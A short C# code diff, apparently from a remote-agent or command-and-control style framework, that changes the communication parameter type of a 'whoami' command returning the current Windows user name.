@@ -12,7 +12,7 @@ namespace Agent.Commands
     {
         public override string Name => "whoami";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             var identity = WindowsIdentity.GetCurrent();
             result.Result = identity.Name;
